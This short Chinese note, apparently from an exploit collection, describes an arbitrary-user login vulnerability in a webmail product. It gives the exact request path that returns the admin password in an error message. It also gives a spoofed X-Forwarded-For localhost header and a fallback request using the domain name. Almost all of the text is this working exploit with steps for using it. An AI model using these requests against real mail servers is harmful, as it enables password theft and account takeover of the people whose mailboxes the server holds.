## WEBMAIL存在任意用户登录漏洞

```
RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin
回显errormsg为密码
用户名为 admin
添加头 X-Forwarded-For: 127.0.0.1

如果有登录失败的话，使用
/RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin@+证书 or 根域名获取 errormsg 登录
```
